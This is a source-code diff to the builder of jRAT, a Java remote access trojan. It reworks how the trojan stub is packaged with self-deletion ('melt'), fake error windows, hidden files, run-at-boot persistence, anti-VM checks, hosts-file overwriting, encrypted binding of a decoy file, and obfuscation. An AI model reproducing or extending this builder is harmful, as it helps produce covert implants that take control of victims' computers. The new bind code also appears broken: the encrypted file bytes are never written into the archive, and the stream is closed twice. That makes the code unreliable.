@@ -27,12 +27,10 @@ import jrat.api.utils.JarUtils;
 import se.jrat.client.BuildStatus;
 import se.jrat.client.Constants;
 import se.jrat.client.ErrorDialog;
-import se.jrat.client.Globals;
 import se.jrat.client.Main;
 import se.jrat.client.OSConfig;
 import se.jrat.client.addons.PluginList;
 import se.jrat.client.addons.StubPlugin;
-import se.jrat.client.crypto.FileCrypter;
 import se.jrat.client.listeners.BuildListener;
 import se.jrat.client.ui.dialogs.DialogSummary;
 import se.jrat.client.utils.ZkmUtils;
@@ -56,7 +54,7 @@ public class Build {
 	}
 
 	@SuppressWarnings("resource")
-	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, boolean dropper, String droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, String droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
+	public static void build(BuildListener listener, File buildFrom, File file, String[] addresses, String id, String pass, int droppath, int reconSec, String name, boolean fakewindow, String faketitle, String fakemessage, int fakeicon, boolean melt, boolean runNextBoot, boolean hiddenFile, boolean bind, String bindpath, String bindname, int droptarget, boolean mutex, int mutexport, PluginList pluginlist, boolean timeout, int timeoutms, boolean delay, int delayms, boolean edithost, String hosttext, boolean overwritehost, boolean trayicon, String icon, String traymsg, String traymsgfail, String traytitle, boolean handleerr, boolean persistance, int persistancems, boolean debugmsg, OSConfig osconfig, boolean summary, Configuration zkm, boolean antivm) {
 		listener.start();
 
 		boolean obfuscate = zkm != null;
@@ -92,8 +90,6 @@ public class Build {
 			
 			if (obfuscate) {
 				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
-			} else if (dropper) {
-				output = tempStubCleanJar;
 			} else {
 				output = file;
 			}
@@ -152,6 +148,33 @@ public class Build {
 				config.put("vm", antivm);
 				config.put("ti", trayicon);
 				
+				config.put("droppath", droppath);
+				config.put("name", name);
+				config.put("melt", melt);
+				config.put("fakewindow", fakewindow);
+				config.put("fakemessage", fakemessage);
+				config.put("faketitle", faketitle);
+				config.put("fakeicon", fakeicon);
+				config.put("delay", delay);
+				config.put("delayms", delayms);
+				config.put("hiddenfile", hiddenFile);
+				config.put("runnextboot", runNextBoot);
+				
+				if (bind) {
+					File bindFile = new File(bindpath);
+
+					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
+
+					config.put("droptarget", droptarget);
+					config.put("bindname", bindname);
+					config.put("extension", extension);
+				}
+
+
+				if (edithost) {
+					config.put("overwritehost", overwritehost);
+				}
+				
 				if (trayicon) {
 					config.put("tititle", "");
 					config.put("timsg", traymsg);
@@ -163,7 +186,6 @@ public class Build {
 					writer.write(str + "=" + config.get(str));
 					writer.newLine();
 				}
-				
 				
 				writer.close();
 				
@@ -183,6 +205,51 @@ public class Build {
 					throw ex;
 				}
 			}
+			
+			if (edithost) {
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				ByteArrayOutputStream baos = new ByteArrayOutputStream();
+				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
+				BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(cios));
+				writer.write(hosttext);
+				writer.close();
+				
+				entry = new ZipEntry("host.dat");
+				outputStub.putNextEntry(entry);
+				outputStub.write(baos.toByteArray());
+				outputStub.closeEntry();
+			}
+
+			listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);
+
+			if (bind) {
+				File bindFile = new File(bindpath);
+				String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
+
+				entry = new ZipEntry(bindname + extension);
+				outputStub.putNextEntry(entry);
+
+				
+				Cipher cipher = CryptoUtils.getBlockCipher(Cipher.ENCRYPT_MODE, secretKey);
+				ByteArrayOutputStream baos = new ByteArrayOutputStream();
+				CipherOutputStream cios = new CipherOutputStream(baos, cipher);
+				
+				FileInputStream fis = new FileInputStream(bindpath);
+				copy(fis, cios);
+				outputStub.closeEntry();
+
+				fis.close();				
+				cios.close();
+				
+				
+
+				listener.reportProgress(90, "Writing file to bind... (" + bindFile.length() + " bytes)", BuildStatus.INFO);
+
+				listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);
+
+			}
+			inputStub.close();
+			outputStub.close();
 
 			if (trayicon) {
 				InputStream trayIcon = null;
@@ -250,106 +317,10 @@ public class Build {
 			outputStub.close();
 			
 			if (obfuscate) {
-				if (dropper) {
-					zkm.setInput(output);
-					zkm.setOutput(tempStubCleanJar);
-					ZkmUtils.obfuscateAtBuild(zkm, listener);
-				} else {
-					zkm.setInput(output);
-					zkm.setOutput(file);
-					ZkmUtils.obfuscateAtBuild(zkm, listener);
-				}
-			}
-
-			if (dropper) {
-				listener.reportProgress(50, "Writing stub into dropper (" + tempStubCleanJar.length() + " bytes)", BuildStatus.INFO);
-				byte[] installerKey = key;
-				FileCrypter.encrypt(tempStubCleanJar, tempCryptedNotRunnableJar, installerKey);
-
-				if (obfuscate) {
-					File temp = File.createTempFile("jrat-build-temp-obfuscated-installer", ".jar");
-					zkm.setInput(Globals.getStubInstaller());
-					zkm.setOutput(temp);
-					ZkmUtils.obfuscateAtBuild(zkm, listener);
-					inputStub = new ZipFile(temp);
-				} else {
-					inputStub = new ZipFile(Globals.getStubInstaller());
-				}
-				outputStub = new ZipOutputStream(new FileOutputStream(file));
-
-				entries = inputStub.entries();
-				while (entries.hasMoreElements()) {
-					entry = entries.nextElement();
-					outputStub.putNextEntry(entry);
-					if (!entry.isDirectory()) {
-						copy(inputStub.getInputStream(entry), outputStub);
-					}
-					outputStub.closeEntry();
-				}
-
-				if (edithost) {
-					entry = new ZipEntry("host.dat");
-					outputStub.putNextEntry(entry);
-					outputStub.write(encode(overwritehost + "\n"));
-					outputStub.write(encode(hosttext));
-					outputStub.closeEntry();
-				}
-
-				entry = new ZipEntry("e");
-
-				outputStub.putNextEntry(entry);
-				copy(new FileInputStream(tempCryptedNotRunnableJar), outputStub);
-				outputStub.closeEntry();
-
-				entry = new ZipEntry("k");
-
-				outputStub.putNextEntry(entry);
-
-				outputStub.write(installerKey);
-				outputStub.write(encodeLine(droppath));
-				outputStub.write(encodeLine(name));
-				outputStub.write(encodeLine(melt));
-				outputStub.write(encodeLine(fakewindow));
-				outputStub.write(encodeLine(fakemessage));
-				outputStub.write(encodeLine(faketitle));
-				outputStub.write(encodeLine(fakeicon));
-				outputStub.write(encodeLine(delay));
-				outputStub.write(encodeLine(delayms));
-				outputStub.write(encodeLine(hiddenFile));
-				outputStub.write(encodeLine(runNextBoot));
-
-				outputStub.closeEntry();
-
-				listener.reportProgress(75, "Wrote key and data", BuildStatus.CHECK);
-
-				if (bind) {
-					File bindFile = new File(bindpath);
-					String extension = bindFile.getName().substring(bindFile.getName().lastIndexOf("."), bindFile.getName().length());
-
-					entry = new ZipEntry(bindname + extension);
-					outputStub.putNextEntry(entry);
-
-					FileInputStream fis = new FileInputStream(bindpath);
-					copy(fis, outputStub);
-					outputStub.closeEntry();
-
-					fis.close();
-
-					listener.reportProgress(90, "Writing file to bind... (" + bindFile.length() + " bytes)", BuildStatus.INFO);
-
-					entry = new ZipEntry("bind.dat");
-					outputStub.putNextEntry(entry);
-					outputStub.write(encodeLine(droptarget));
-					outputStub.write(encodeLine(bindname));
-					outputStub.write(encodeLine(extension));
-					outputStub.closeEntry();
-
-					listener.reportProgress(90, "Wrote file to bind", BuildStatus.CHECK);
-
-				}
-				inputStub.close();
-				outputStub.close();
-			}
+				zkm.setInput(output);
+				zkm.setOutput(file);
+				ZkmUtils.obfuscateAtBuild(zkm, listener);			
+			}					
 
 			long end = System.currentTimeMillis();
 			
